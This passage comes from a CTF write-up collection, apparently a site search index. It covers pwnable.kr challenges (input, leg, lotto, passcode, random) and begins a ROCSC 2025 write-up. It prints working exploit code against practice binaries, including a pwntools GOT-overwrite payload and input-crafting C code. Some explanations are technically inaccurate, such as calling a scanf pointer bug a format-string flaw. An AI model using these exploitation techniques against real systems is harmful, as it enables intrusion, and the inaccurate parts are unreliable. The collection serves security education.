| O_CREAT, 00777);\nwrite(new_stderr, \"\\x00\\x0a\\x02\\xff\", 4);\n\n// Reset file offsets to the beginning\nlseek(new_stdin, 0, SEEK_SET);\nlseek(new_stderr, 0, SEEK_SET);\n\n// Redirect input/output streams\ndup2(new_stdin, 0);  // Redirect standard input (stdin)\ndup2(new_stderr, 2); // Redirect standard error (stderr)\n</code></pre>"},{"location":"pwnable.kr/pwnable-input/description/#step-3-environment-variable-injection","title":"Step 3: Environment Variable Injection","text":""},{"location":"pwnable.kr/pwnable-input/description/#conditions_2","title":"Conditions:","text":"<p>The binary checks for an environment variable with the key <code>\\xde\\xad\\xbe\\xef</code> and value <code>\\xca\\xfe\\xba\\xbe</code>.</p>"},{"location":"pwnable.kr/pwnable-input/description/#solution_2","title":"Solution:","text":"<pre><code>char *new_envp[2];\nnew_envp[0] = \"\\xde\\xad\\xbe\\xef=\\xca\\xfe\\xba\\xbe\";\nnew_envp[1] = NULL;  // Null-terminate the environment variable array\n</code></pre>"},{"location":"pwnable.kr/pwnable-input/description/#step-4-file-creation-and-writing","title":"Step 4: File Creation and Writing","text":""},{"location":"pwnable.kr/pwnable-input/description/#conditions_3","title":"Conditions:","text":"<p>The binary attempts to open a file named <code>\\x0a</code> (newline character) and expects it to contain <code>\\x00\\x00\\x00\\x00</code>.</p>"},{"location":"pwnable.kr/pwnable-input/description/#solution_3","title":"Solution:","text":"<pre><code>// Create and write the expected data to the file named \"\\x0a\"\nint newline = open(\"./\\x0a\", O_RDWR | O_CREAT, 00777);\nwrite(newline, \"\\x00\\x00\\x00\\x00\", 4);\nclose(newline);\n</code></pre>"},{"location":"pwnable.kr/pwnable-input/description/#step-5-handling-tcp-connection","title":"Step 5: Handling TCP Connection","text":""},{"location":"pwnable.kr/pwnable-input/description/#conditions_4","title":"Conditions:","text":"<p>The binary listens on the port provided in <code>argv['C']</code> and expects the value <code>\\xde\\xad\\xbe\\xef</code> to be sent via a TCP connection.</p>"},{"location":"pwnable.kr/pwnable-input/description/#solution_4","title":"Solution:","text":"<ol> <li> <p>Set the required port in <code>argv</code>:     <pre><code>new_argv['C'] = \"8080\";\n</code></pre></p> </li> <li> <p>In a separate terminal, send the required input via netcat:     <pre><code>python -c 'print '\\xde\\xad\\xbe\\xef'' | nc localhost 8080\n</code></pre></p> </li> </ol>"},{"location":"pwnable.kr/pwnable-input/description/#final-step-executing-the-binary","title":"Final Step: Executing the Binary","text":"<p>Once all required input mechanisms are set up, we need to execute the binary with the prepared arguments and environment variables.</p>"},{"location":"pwnable.kr/pwnable-input/description/#solution_5","title":"Solution:","text":"<pre><code>execve(\"/path/to/input2\", new_argv, new_envp);\n</code></pre>"},{"location":"pwnable.kr/pwnable-input/description/#full-exploit-code","title":"Full Exploit Code","text":"<p>Putting everything together:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n    // Step 1: Prepare ARGV\n    char *new_argv[101];\n    for (int i = 0; i &lt; 100; i++) {\n        new_argv[i] = \"\";\n    }\n    new_argv[100] = NULL;\n    new_argv['A'] = \"\\x00\";  // 65th element\n    new_argv['B'] = \"\\x20\\x0a\\x0d\";  // 66th element\n    new_argv['C'] = \"8080\";  // Step 5: Set TCP port\n\n    // Step 2: Handle standard input/output\n    int new_stdin = open(\"./first\", O_RDWR | O_CREAT, 00777);\n    write(new_stdin, \"\\x00\\x0a\\x00\\xff\", 4);\n\n    int new_stderr = open(\"./second\", O_RDWR | O_CREAT, 00777);\n    write(new_stderr, \"\\x00\\x0a\\x02\\xff\", 4);\n\n    lseek(new_stdin, 0, SEEK_SET);\n    lseek(new_stderr, 0, SEEK_SET);\n\n    dup2(new_stdin, 0);  // Redirect stdin\n    dup2(new_stderr, 2);  // Redirect stderr\n\n    // Step 3: Set environment variables\n    char *new_envp[2];\n    new_envp[0] = \"\\xde\\xad\\xbe\\xef=\\xca\\xfe\\xba\\xbe\";\n    new_envp[1] = NULL;\n\n    // Step 4: Create required file\n    int newline = open(\"./\\x0a\", O_RDWR | O_CREAT, 00777);\n    write(newline, \"\\x00\\x00\\x00\\x00\", 4);\n    close(newline);\n\n    // Step 6: Execute binary with prepared arguments and environment\n    execve(\"/path/to/input2\", new_argv, new_envp);\n\n    return 0;\n}\n</code></pre>"},{"location":"pwnable.kr/pwnable-input/description/#running-the-exploit","title":"Running the Exploit","text":"<ol> <li>Compile the exploit code:     <pre><code>gcc exploit.c -o exploit -w\n</code></pre></li> <li>Run the exploit:     <pre><code>./exploit\n</code></pre></li> <li>Open another terminal and send the TCP payload:     <pre><code>python3 -c 'print(\"\\xde\\xad\\xbe\\xef\")' | nc localhost 8080\n</code></pre></li> </ol>"},{"location":"pwnable.kr/pwnable-input/description/#expected-output","title":"Expected Output","text":"<p>If all steps are executed correctly, you should see:</p> <pre><code>Congratulations! Here is your flag: FLAG{xxxxxxxx}\n</code></pre>"},{"location":"pwnable.kr/pwnable-input/description/#key-takeaways","title":"Key Takeaways","text":"<ol> <li>Understanding Input Sources in C Programs:</li> <li>ARGV (Command-line arguments)</li> <li>STDIN/STDERR redirection</li> <li>Environment variables</li> <li>File manipulation</li> <li> <p>Network communication</p> </li> <li> <p>Working with System Calls:</p> </li> <li> <p><code>open()</code>, <code>write()</code>, <code>lseek()</code>, <code>dup2()</code>, <code>execve()</code> are key system calls used in exploiting and interacting with binary programs.</p> </li> <li> <p>Practical Exploitation Approaches:</p> </li> <li>Manipulating file descriptors and memory to bypass security checks.</li> </ol>"},{"location":"pwnable.kr/pwnable-leg/description/","title":"Description","text":""},{"location":"pwnable.kr/pwnable-leg/description/#challenge-8-leg","title":"Challenge 8: LEG","text":""},{"location":"pwnable.kr/pwnable-leg/description/#challenge-overview","title":"Challenge Overview","text":"<p>This challenge involves a binary file with ARM assembly instructions and multiple key-returning functions. The goal is to reverse engineer the binary, extract the key values returned by three functions (<code>key1</code>, <code>key2</code>, and <code>key3</code>), and sum them to provide the correct input to unlock the flag.</p>"},{"location":"pwnable.kr/pwnable-leg/description/#understanding-the-code","title":"Understanding the Code","text":""},{"location":"pwnable.kr/pwnable-leg/description/#challenge-code","title":"Challenge Code","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;fcntl.h&gt;\n\nint key1() {\n    asm(\"mov r3, pc\\n\");\n}\n\nint key2() {\n    asm(\n        \"push   {r6}\\n\"\n        \"add    r6, pc, $1\\n\"\n        \"bx     r6\\n\"\n        \".code   16\\n\"\n        \"mov    r3, pc\\n\"\n        \"add    r3, $0x4\\n\"\n        \"push   {r3}\\n\"\n        \"pop    {pc}\\n\"\n        \".code  32\\n\"\n        \"pop    {r6}\\n\"\n    );\n}\n\nint key3() {\n    asm(\"mov r3, lr\\n\");\n}\n\nint main() {\n    int key = 0;\n    printf(\"Daddy has very strong arm! : \");\n    scanf(\"%d\", &amp;key);\n\n    if ((key1() + key2() + key3()) == key) {\n        printf(\"Congratz!\\n\");\n        int fd = open(\"flag\", O_RDONLY);\n        char buf[100];\n        int r = read(fd, buf, 100);\n        write(0, buf, r);\n    } else {\n        printf(\"I have strong leg :P\\n\");\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"pwnable.kr/pwnable-leg/description/#challenge-breakdown","title":"Challenge Breakdown","text":"<ol> <li>Objective:</li> <li>Extract the values returned by <code>key1</code>, <code>key2</code>, and <code>key3</code>.</li> <li> <p>Add these values together to calculate the input (<code>key</code>) required to unlock the flag.</p> </li> <li> <p>Key Assembly Features:</p> </li> <li>ARM architecture is used.</li> <li> <p>The program involves ARM-specific concepts:</p> <ul> <li>PC (Program Counter): Holds the address of the next instruction.</li> <li>LR (Link Register): Stores the return address of a function.</li> <li>BX Instruction: Branches to a new instruction and switches between ARM (32-bit) and Thumb (16-bit) modes.</li> </ul> </li> <li> <p>Steps:</p> </li> <li>Disassemble the binary to analyze <code>key1</code>, <code>key2</code>, and <code>key3</code>.</li> <li>Calculate the values returned by each function.</li> <li>Add these values to determine the required input.</li> </ol>"},{"location":"pwnable.kr/pwnable-leg/description/#reversing-the-binary","title":"Reversing the Binary","text":""},{"location":"pwnable.kr/pwnable-leg/description/#1-analyzing-key1","title":"1. Analyzing <code>key1</code>","text":"<p>The function: <pre><code>int key1() {\n    asm(\"mov r3, pc\\n\");\n}\n</code></pre> - This instruction moves the PC (Program Counter) into <code>r3</code>, which is then returned. - ARM architecture uses 32-bit instructions, meaning <code>PC</code> holds the address of the next instruction, typically 8 bytes ahead.</p> <p>From the disassembly: <pre><code>0x00008cd4 &lt;key1&gt;:   mov r3, pc\n</code></pre> - The next instruction address is <code>0x00008ce4</code>. - </p> <p><code>key1</code> Value: <pre><code>Key1 = 0x00008ce4\n</code></pre></p>"},{"location":"pwnable.kr/pwnable-leg/description/#2-analyzing-key3","title":"2. Analyzing <code>key3</code>","text":"<p>The function: <pre><code>int key3() {\n    asm(\"mov r3, lr\\n\");\n}\n</code></pre> - This instruction moves the LR (Link Register) into <code>r3</code>, which is then returned. - LR stores the return address after the function call.</p> <p>From the <code>main</code> function: <pre><code>0x00008d7c &lt;main&gt;:   bl      0x8d20 &lt;key3&gt;\n0x00008d84 &lt;main&gt;:   add     r2, r4, r3\n</code></pre> - The <code>bl</code> (Branch and Link) instruction calls <code>key3</code>, storing the return address in <code>LR</code>. - The return address is the next instruction: <code>0x00008d80</code>.</p> <p><code>key3</code> Value: <pre><code>Key3 = 0x00008d80\n</code></pre></p>"},{"location":"pwnable.kr/pwnable-leg/description/#3-analyzing-key2","title":"3. Analyzing <code>key2</code>","text":"<p>The function: <pre><code>int key2() {\n    asm(\n        \"push   {r6}\\n\"\n        \"add    r6, pc, $1\\n\"\n        \"bx     r6\\n\"\n        \".code   16\\n\"\n        \"mov    r3, pc\\n\"\n        \"add    r3, $0x4\\n\"\n        \"push   {r3}\\n\"\n        \"pop    {pc}\\n\"\n        \".code  32\\n\"\n        \"pop    {r6}\\n\"\n    );\n}\n</code></pre></p> <p>Execution Flow: 1. <code>push {r6}</code>:    - Pushes <code>r6</code> onto the stack.    - Stack: <code>r6</code>.</p> <ol> <li><code>add r6, pc, $1</code>:</li> <li>Adds <code>PC + 1</code> to <code>r6</code>.</li> <li> <p>This switches the architecture to Thumb mode (<code>PC</code>\u2019s LSB becomes <code>1</code>).</p> </li> <li> <p><code>bx r6</code>:</p> </li> <li> <p>Branches to <code>r6</code> and switches to Thumb mode (16-bit instructions).</p> </li> <li> <p>Thumb Mode:</p> </li> <li><code>mov r3, pc</code> sets <code>r3</code> to the next instruction\u2019s address (4 bytes ahead): <code>0x00008d08</code>.</li> <li><code>adds r3, #4</code> increments <code>r3</code> to <code>0x00008d0c</code>.</li> <li><code>push {r3}</code> pushes <code>r3</code> onto the stack.</li> <li> <p><code>pop {pc}</code> pops the value (<code>0x00008d0c</code>) into <code>PC</code>, branching execution to <code>0x00008d0c</code>.</p> </li> <li> <p>Back to ARM Mode:</p> </li> <li><code>pop {r6}</code> restores <code>r6</code> with the value <code>0x00008d0c</code> from the stack.</li> <li>The function ends, returning <code>r6</code>.</li> </ol> <p><code>key2</code> Value: <pre><code>Key2 = 0x00008d0c\n</code></pre></p>"},{"location":"pwnable.kr/pwnable-leg/description/#combining-the-keys","title":"Combining the Keys","text":""},{"location":"pwnable.kr/pwnable-leg/description/#summing-the-keys","title":"Summing the Keys","text":"<p>The program checks if: <pre><code>key1() + key2() + key3() == key\n</code></pre> From our analysis: <pre><code>Key1 = 0x00008ce4\nKey2 = 0x00008d0c\nKey3 = 0x00008d80\n</code></pre> Sum: <pre><code>0x00008ce4 + 0x00008d0c + 0x00008d80 = 0x1A770\n</code></pre></p>"},{"location":"pwnable.kr/pwnable-leg/description/#convert-to-decimal","title":"Convert to Decimal","text":"<p>The required input is: <pre><code>0x1A770 = 108,400\n</code></pre></p>"},{"location":"pwnable.kr/pwnable-leg/description/#solution","title":"Solution","text":""},{"location":"pwnable.kr/pwnable-leg/description/#steps-to-solve","title":"Steps to Solve","text":"<ol> <li>Run the program:    <pre><code>./leg\n</code></pre></li> <li>Input the calculated key:    <pre><code>108400\n</code></pre></li> <li>The program will output the flag:    <pre><code>Congratz!\n&lt;flag&gt;\n</code></pre> </li> </ol>"},{"location":"pwnable.kr/pwnable-leg/description/#key-takeaways","title":"Key Takeaways","text":"<ol> <li>ARM-Specific Concepts:</li> <li>Understanding <code>PC</code>, <code>LR</code>, and <code>BX</code> instructions is crucial.</li> <li> <p>Switching between ARM and Thumb mode affects instruction sizes.</p> </li> <li> <p>Disassembly Analysis:</p> </li> <li> <p>Breaking down the assembly step-by-step helps understand program behavior.</p> </li> <li> <p>Reverse Engineering Workflow:</p> </li> <li>Disassemble the binary to extract logic.</li> <li>Analyze function behavior to determine required inputs.</li> </ol>"},{"location":"pwnable.kr/pwnable-lotto/description/","title":"Description","text":""},{"location":"pwnable.kr/pwnable-lotto/description/#challenge-13-lotto","title":"Challenge 13: Lotto","text":""},{"location":"pwnable.kr/pwnable-lotto/description/#challenge-overview","title":"Challenge Overview","text":"<p>The objective of this challenge is to \"guess\" 6 random numbers between 1 and 46, generated by the program, to reveal the flag.</p> <p>At first glance, this seems impossible due to the randomness of the numbers generated from <code>/dev/urandom</code>. However, the program contains a logic vulnerability that allows us to bypass the randomness and \"win\" the lotto by exploiting the comparison logic in the code.</p>"},{"location":"pwnable.kr/pwnable-lotto/description/#code-analysis","title":"Code Analysis","text":""},{"location":"pwnable.kr/pwnable-lotto/description/#key-code-snippets","title":"Key Code Snippets","text":"<ol> <li>Random Number Generation:    <pre><code>int fd = open(\"/dev/urandom\", O_RDONLY);\nif (fd == -1) {\n    printf(\"error. tell admin\\n\");\n    exit(-1);\n}\nunsigned char lotto[6];\nif (read(fd, lotto, 6) != 6) {\n    printf(\"error2. tell admin\\n\");\n    exit(-1);\n}\n</code></pre></li> <li>The program generates 6 random bytes from <code>/dev/urandom</code> and stores them in the <code>lotto</code> array.</li> <li> <p>Each byte is reduced to the range <code>[1, 46]</code> using:      <pre><code>lotto[i] = lotto[i] % 45 + 1;\n</code></pre></p> </li> <li> <p>User Input:</p> </li> <li>The program reads 6 bytes from the user (stored in <code>submit</code>).</li> <li> <p>The goal is to \"match\" all 6 numbers between the <code>lotto</code> and <code>submit</code> arrays.</p> </li> <li> <p>Score Calculation (Vulnerable Logic):    <pre><code>int match = 0, j = 0;\nfor (i = 0; i &lt; 6; i++) {\n    for (j = 0; j &lt; 6; j++) {\n        if (lotto[i] == submit[j]) {\n            match++;\n        }\n    }\n}\n</code></pre></p> </li> <li>This nested loop compares every number in <code>lotto</code> with every number in <code>submit</code>.</li> <li>The issue is that repeated numbers in <code>submit</code> will cause multiple matches even if <code>lotto</code> contains only one matching number.</li> </ol>"},{"location":"pwnable.kr/pwnable-lotto/description/#exploitation-strategy","title":"Exploitation Strategy","text":"<p>The flawed comparison logic allows us to manipulate the <code>match</code> counter. Specifically: - If we provide input such as <code>\\x01\\x01\\x01\\x01\\x01\\x01</code> (all 1s), every occurrence of <code>1</code> in <code>lotto</code> will contribute 6 matches because it\u2019s compared against each <code>1</code> in <code>submit</code>.</p> <p>Thus, we can repeatedly play the lotto until the random numbers generated by <code>/dev/urandom</code> include at least one <code>1</code>. This will result in <code>match == 6</code>, and the flag will be revealed.</p>"},{"location":"pwnable.kr/pwnable-lotto/description/#exploitation-approaches","title":"Exploitation Approaches","text":""},{"location":"pwnable.kr/pwnable-lotto/description/#option-1-manual-automation-with-python-cli","title":"Option 1: Manual Automation with Python CLI","text":"<p>You can run the following Python command in the CLI repeatedly until the flag is displayed: <pre><code>python3 -c \"print('1\\n' + '\\x01' * 6 + '3\\n')\"\n</code></pre> - This command:   - Selects the \"Play Lotto\" option (<code>1\\n</code>).   - Submits the input <code>\\x01\\x01\\x01\\x01\\x01\\x01</code>.   - Exits the program (<code>3\\n</code>). - Repeat this command until the flag appears.</p>"},{"location":"pwnable.kr/pwnable-lotto/description/#option-2-full-python-automation-script","title":"Option 2: Full Python Automation Script","text":"<p>For full automation, create a Python script that interacts with the binary. The script will: 1. Continuously play the lotto by selecting menu option <code>1</code>. 2. Input <code>\\x01\\x01\\x01\\x01\\x01\\x01</code> as the 6-byte submission. 3. Loop until the flag is displayed.</p> <p>The script can be found in the repository.</p>"},{"location":"pwnable.kr/pwnable-lotto/description/#how-the-script-works","title":"How the Script Works","text":"<ol> <li>Menu Interaction:</li> <li> <p>The program waits for user input to select a menu option. The script sends <code>1</code> to select \"Play Lotto.\"</p> </li> <li> <p>Input Submission:</p> </li> <li>The script submits <code>\\x01\\x01\\x01\\x01\\x01\\x01</code> as the input.</li> <li> <p>This input exploits the flawed comparison logic to potentially generate a match of 6.</p> </li> <li> <p>Repeat Until Success:</p> </li> <li>The script keeps running the binary until stopped</li> </ol>"},{"location":"pwnable.kr/pwnable-lotto/description/#exploit","title":"Exploit","text":"<pre><code>from pwn import *\n\n# Path to the binary\nconn = process('/root/ctf/lotto/lotto')  # Adjust the path to your binary\n\nwhile True:\n    # Receive the menu\n    menu = conn.recvuntil(b\"3. Exit\\n\", timeout=2).decode()\n    print(menu)  # Debug print to verify what the program outputs\n\n    # Send the menu choice: \"1\" for Play Lotto\n    conn.sendline(b\"1\")\n\n    # Receive the prompt for submitting lotto bytes\n    prompt = conn.recvuntil(b\"Submit your 6 lotto bytes :\").decode()\n    print(prompt)  # Debug print to verify prompt\n\n    # Send 6 bytes as the lotto ticket\n    ticket = b'\\x01\\x01\\x01\\x01\\x01\\x01'  # Replace with your desired values\n    conn.sendline(ticket)\n\n    # Read the response after submitting the ticket\n    response = conn.recvline(timeout=2).decode()\n    print(response)  # Debug print to verify result\n\n# Close the connection\nconn.close()\n</code></pre>"},{"location":"pwnable.kr/pwnable-lotto/description/#key-takeaways","title":"Key Takeaways","text":"<ol> <li>Logical Vulnerability:</li> <li> <p>The comparison logic in the program is flawed because it allows repeated numbers in the user\u2019s input to artificially inflate the <code>match</code> counter.</p> </li> <li> <p>Breaking Randomness:</p> </li> <li> <p>Instead of trying to guess the random numbers, we exploit the program's flawed design to \"win\" without truly matching all 6 numbers.</p> </li> <li> <p>Automation:</p> </li> <li>Automating repetitive tasks is essential for CTF challenges, especially when dealing with randomness.</li> </ol>"},{"location":"pwnable.kr/pwnable-passcode/description/","title":"Description","text":""},{"location":"pwnable.kr/pwnable-passcode/description/#challenge-5-passcode-exploit","title":"Challenge 5: Passcode Exploit","text":""},{"location":"pwnable.kr/pwnable-passcode/description/#challenge-overview","title":"Challenge Overview","text":"<p>In this challenge, we are provided with a vulnerable login system written in C that contains a format string vulnerability in the <code>scanf()</code> function, which can be exploited to overwrite a function pointer and redirect execution to reveal the flag.</p>"},{"location":"pwnable.kr/pwnable-passcode/description/#code-analysis","title":"Code Analysis","text":""},{"location":"pwnable.kr/pwnable-passcode/description/#vulnerable-code-snippet","title":"Vulnerable Code Snippet","text":"<pre><code>void login()\n{\n    int passcode1;\n    int passcode2;\n\n    printf(\"enter passcode1 : \");\n    scanf(\"%d\", passcode1);  // Vulnerability here\n    fflush(stdin);\n\n    printf(\"enter passcode2 : \");\n    scanf(\"%d\", passcode2);\n\n    printf(\"checking...\\n\");\n    if (passcode1 == 338150 &amp;&amp; passcode2 == 13371337)\n    {\n        printf(\"Login OK!\\n\");\n        system(\"/bin/cat flag\");\n    }\n    else\n    {\n        printf(\"Login Failed!\\n\");\n        exit(0);\n    }\n}\n</code></pre>"},{"location":"pwnable.kr/pwnable-passcode/description/#identified-vulnerabilities","title":"Identified Vulnerabilities","text":"<ol> <li>Format String Vulnerability:</li> <li>The <code>scanf(\"%d\", passcode1);</code> function is used incorrectly.</li> <li> <p>The <code>scanf()</code> function expects an address, but instead, <code>passcode1</code> (uninitialized variable) is passed directly, leading to a segmentation fault.</p> </li> <li> <p>Buffer Overflow Potential:</p> </li> <li>The <code>welcome()</code> function has a buffer overflow possibility:      <pre><code>char name[100];\nprintf(\"enter your name : \");\nscanf(\"%100s\", name);\n</code></pre></li> <li> <p>We can control the last 4 bytes of this buffer and overwrite adjacent memory.</p> </li> <li> <p>Overwriting Function Pointers:</p> </li> <li>From <code>objdump -R</code> analysis, the <code>fflush</code> function is dynamically linked at the address <code>0x0804a004</code>, and this can be overwritten.     </li> </ol>"},{"location":"pwnable.kr/pwnable-passcode/description/#exploit-strategy","title":"Exploit Strategy","text":""},{"location":"pwnable.kr/pwnable-passcode/description/#step-1-finding-the-buffer-overflow-offset","title":"Step 1: Finding the Buffer Overflow Offset","text":"<p>Using the GDB debugger, we analyze memory and find that the last 4 bytes of the <code>name</code> buffer are stored at <code>$ebp-16</code>. This confirms that after 96 bytes, we can overwrite the adjacent memory location.</p>"},{"location":"pwnable.kr/pwnable-passcode/description/#gdb-analysis-commands","title":"GDB Analysis Commands","text":"<ol> <li>Run the binary and input a long string of 100 characters.    <pre><code>gdb ./passcode\n</code></pre></li> <li>Set a breakpoint at <code>login</code> and inspect memory:    <pre><code>b login\nrun\nx/20wx $ebp-16  # Examine memory near passcode1 location\n</code></pre></li> </ol> <p>Expected output:     </p> <p>This confirms that we have control over the last 4 bytes.</p>"},{"location":"pwnable.kr/pwnable-passcode/description/#step-2-overwriting-the-fflush-function-pointer","title":"Step 2: Overwriting the <code>fflush</code> Function Pointer","text":"<p>Using <code>objdump -R</code> to check relocatable symbols: <pre><code>objdump -R ./passcode\n</code></pre></p> <p>Output: </p> <p>We can overwrite this address and redirect execution.</p>"},{"location":"pwnable.kr/pwnable-passcode/description/#step-3-finding-the-target-address-system-call-execution","title":"Step 3: Finding the Target Address (System Call Execution)","text":"<p>Disassembling the binary using <code>objdump -D</code>: <pre><code>objdump -D ./passcode | grep \"system\"\n</code></pre>  We find that the address <code>0x080485d7</code> calls <code>system(\"/bin/cat flag\")</code>. Our goal is to jump to this address.</p>"},{"location":"pwnable.kr/pwnable-passcode/description/#step-4-constructing-the-exploit","title":"Step 4: Constructing the Exploit","text":"<ol> <li>Buffer Overflow Payload Construction:</li> <li>Send <code>96</code> bytes to fill the buffer.</li> <li>Overwrite the next 4 bytes with the address of <code>fflush</code> (<code>0x0804a004</code>).</li> <li>Use <code>scanf</code> to overwrite the function pointer with <code>0x080485d7</code> (system call).</li> </ol>"},{"location":"pwnable.kr/pwnable-passcode/description/#python-exploit-script","title":"Python Exploit Script","text":"<p>We can automate the exploit using <code>pwntools</code>:</p> <pre><code>from pwn import *\n\n# Load the binary\nelf = ELF('/home/passcode/passcode')\n\n# Start the process\np = process('/home/passcode/passcode')\n\n# Step 1: Overflow name buffer and overwrite fflush address\npayload = b\"A\" * 96  # Fill buffer\npayload += p32(0x0804a004)  # Overwrite the fflush GOT entry\n\n# Send the overflow payload\np.sendline(payload)\n\n# Step 2: Send system() address to scanf()\np.sendline(str(0x080485d7))\n\n# Step 3: Receive the flag output\nprint(p.recvall().decode())\n</code></pre>"},{"location":"pwnable.kr/pwnable-passcode/description/#explanation-of-exploit-steps","title":"Explanation of Exploit Steps","text":"<ol> <li>Overflow the buffer: </li> <li>Input <code>96</code> characters of padding.</li> <li> <p>Overwrite the <code>fflush</code> function pointer at <code>0x0804a004</code>.</p> </li> <li> <p>Redirect execution: </p> </li> <li>Provide the system function address as input to the vulnerable <code>scanf()</code>.</li> <li>The program will jump to <code>system(\"/bin/cat flag\")</code> and print the flag.</li> </ol>"},{"location":"pwnable.kr/pwnable-passcode/description/#step-5-running-the-exploit","title":"Step 5: Running the Exploit","text":"<ol> <li>Save the script as <code>exploit.py</code>.</li> <li>Run the script:    <pre><code>python3 exploit.py\n</code></pre></li> </ol> <p>Expected output: <pre><code>Toddler's Secure Login System 1.0 beta.\nenter your name:\nenter passcode1:\nenter passcode2:\nchecking...\nLogin OK!\n&lt;FLAG&gt;\n</code></pre></p>"},{"location":"pwnable.kr/pwnable-passcode/description/#key-takeaways","title":"Key Takeaways","text":"<ol> <li>Exploitation Techniques Used:</li> <li>Buffer Overflow to overwrite function pointers.</li> <li>Understanding of function relocation using <code>objdump -R</code>.</li> <li> <p>Dynamic redirection of execution flow using memory corruption.</p> </li> <li> <p>Lessons Learned:</p> </li> <li>Proper use of <code>scanf()</code> requires passing the address of variables.</li> <li>Security implications of leaving function pointers writable.</li> <li>Defense techniques include:<ul> <li>Enabling stack protection (<code>-fstack-protector</code>).</li> <li>Read-only GOT protection (<code>RELRO</code> in ELF).</li> <li>Using bounds-checked input functions like <code>fgets()</code>.</li> </ul> </li> </ol>"},{"location":"pwnable.kr/pwnable-passcode/description/#alternative-solutions","title":"Alternative Solutions","text":"<ul> <li>If Address Space Layout Randomization (ASLR) is enabled, a brute-force approach might be needed.</li> <li>Static analysis with tools like <code>Ghidra</code> to inspect function addresses directly.</li> </ul>"},{"location":"pwnable.kr/pwnable-random/description/","title":"Description","text":""},{"location":"pwnable.kr/pwnable-random/description/#challenge-6-random-key","title":"Challenge 6: Random Key","text":""},{"location":"pwnable.kr/pwnable-random/description/#challenge-code","title":"Challenge Code","text":"<pre><code>int main() {\n    unsigned int random;\n    random = rand();        // random value!\n\n    unsigned int key = 0;\n    scanf(\"%d\", &amp;key);\n\n    if ((key ^ random) == 0xdeadbeef) {\n        printf(\"Good!\\n\");\n        system(\"/bin/cat flag\");\n        return 0;\n    }\n\n    printf(\"Wrong, maybe you should try 2^32 cases.\\n\");\n    return 0;\n}\n</code></pre>"},{"location":"pwnable.kr/pwnable-random/description/#challenge-objective","title":"Challenge Objective","text":"<p>To obtain the flag, the program must satisfy the condition: <pre><code>(key ^ random) == 0xdeadbeef\n</code></pre></p> <p>To achieve this: 1. Determine the value of <code>random</code>, which is generated at runtime using the <code>rand()</code> function. 2. Calculate the required <code>key</code> value based on <code>random</code>. 3. Input the calculated <code>key</code> into the program to reveal the flag.</p>"},{"location":"pwnable.kr/pwnable-random/description/#key-observations","title":"Key Observations","text":"<ol> <li>Behavior of <code>rand()</code>:</li> <li>The <code>rand()</code> function in C generates pseudo-random numbers.</li> <li>By default, <code>rand()</code> starts with the same seed (usually <code>1</code>) unless explicitly initialized with <code>srand()</code>.</li> <li> <p>This means the sequence of random numbers is predictable if <code>srand()</code> is not used.</p> </li> <li> <p>The Key Formula:    The relationship between <code>key</code> and <code>random</code> is:    <pre><code>key = random ^ 0xdeadbeef\n</code></pre>    Using the generated value of <code>random</code>, we can calculate the required <code>key</code>.</p> </li> </ol>"},{"location":"pwnable.kr/pwnable-random/description/#step-by-step-solution","title":"Step-by-Step Solution","text":""},{"location":"pwnable.kr/pwnable-random/description/#step-1-replicate-the-random-number-locally","title":"Step 1: Replicate the Random Number Locally","text":"<p>Write a simple C program to replicate the <code>rand()</code> function and extract the first random value: <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    unsigned int random = rand(); // Default seed (no srand)\n    printf(\"Random: %u\\n\", random);\n    return 0;\n}\n</code></pre></p> <ol> <li>Compile and run the program:    <pre><code>gcc random_generator.c -o random_generator\n./random_generator\n</code></pre></li> <li>The output will give the value of <code>random</code> (e.g., <code>1804289383</code>).</li> </ol>"},{"location":"pwnable.kr/pwnable-random/description/#step-2-calculate-the-key","title":"Step 2: Calculate the Key","text":"<p>Using the value of <code>random</code>, calculate the required <code>key</code> in Python: <pre><code># Replace 1804289383 with the actual random value from the above program\nrandom = 1804289383\nkey = random ^ 0xdeadbeef\nprint(f\"The key is: {key}\")\n</code></pre></p> <ol> <li>Save this code to a file (e.g., <code>generate_key.py</code>).</li> <li>Run the script:    <pre><code>python3 generate_key.py\n</code></pre></li> <li>It will print the calculated key:    <pre><code>The key is: 568134134\n</code></pre></li> </ol>"},{"location":"pwnable.kr/pwnable-random/description/#step-3-run-the-challenge-program","title":"Step 3: Run the Challenge Program","text":"<ol> <li>Run the provided challenge binary:    <pre><code>./random\n</code></pre></li> <li>Input the key obtained from the Python script (e.g., <code>568134134</code>).</li> <li>If the key is correct, the program will print:    <pre><code>Good!\n&lt;flag&gt;\n</code></pre></li> </ol>"},{"location":"pwnable.kr/pwnable-random/description/#detailed-explanation","title":"Detailed Explanation","text":""},{"location":"pwnable.kr/pwnable-random/description/#predicting-rand","title":"Predicting <code>rand()</code>:","text":"<p>The challenge exploits the fact that <code>rand()</code> generates a deterministic sequence of numbers if <code>srand()</code> is not used. The first call to <code>rand()</code> always returns the same value for a given platform and compiler configuration.</p>"},{"location":"pwnable.kr/pwnable-random/description/#how-the-key-works","title":"How the Key Works:","text":"<ol> <li>The program checks:    <pre><code>if ((key ^ random) == 0xdeadbeef)\n</code></pre></li> <li>Rearranging:    <pre><code>key = random ^ 0xdeadbeef\n</code></pre></li> <li>By calculating <code>key</code> with the known value of <code>random</code>, you ensure the condition evaluates to true.</li> </ol>"},{"location":"rocsc2025/","title":"ROCSC 2025 - Romanian Cybersecurity Challenge","text":"<p>This directory contains writeups for ROCSC 2025 challenges organized by category.</p>"},{"location":"rocsc2025/#mathematical","title":"Mathematical","text":"Challenge Description mathrix Matrix operations and number theory"},{"location":"rocsc2025/#web","title":"Web","text":"Challenge Description formula1 Algorithm optimization challenge fruit-salad NoSQL injection and hidden data"},{"location":"rocsc2025/#osint","title":"OSINT","text":"Challenge Description exfill-very funny Data exfiltration analysis <p>Total Challenges: 4 Categories: Mathematical, Web, OSINT</p> <p>Back to Main Repository</p>"},{"location":"rocsc2025/exfill-very%20funny/description/","title":"CTF Challenge Write-up: exfill-very funny","text":"<p>In this challenge, we analyze a Wireshark capture file to extract hidden information from HTTP traffic.</p>"},{"location":"rocsc2025/exfill-very%20funny/description/#initial-analysis","title":"Initial Analysis","text":"<p>We begin by filtering HTTP requests and responses in the capture file.</p> <p></p> <p>From the filtered results, we observe multiple HTTP streams worth investigating 